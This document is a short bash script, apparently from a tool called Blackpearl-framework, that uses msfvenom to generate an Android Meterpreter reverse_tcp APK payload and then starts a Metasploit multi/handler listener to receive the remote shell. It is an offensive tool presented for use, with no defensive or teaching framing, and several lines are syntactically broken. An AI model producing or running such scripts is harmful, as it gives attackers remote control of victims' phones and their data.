#!/bin/bash
g='\e[1;32m'
r='\e[1;31m'
clear 
echo
read - p "Enter your ip" ip
echo
echo "Making Payload"
echo
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 R > /sdcard/file.apk
echo -e $g "~~~~~~~~~~~~~~~~~~~~~~~~~"
echo -e $g"YOUR PAYLOAD IS SAVED IN SDCARD"
echo "\
echo "  *WAITING FOR REMOTE LISTENER*
echo -e $g "~~~~~~~~~~~~~~~~~~~~~~~~~"
echo -e $g" Opening metasploit meterpreter"
msfconsole -q -x "use exploit/multi/handler ; set payload android/meterpreter/reverse_tcp ; set lhost $ip ; set lport 4444 ; exploit ;" 
echo
echo
read -p "Press enter to go back" enter
cd Blackpearl-framework/lib
python msf.py
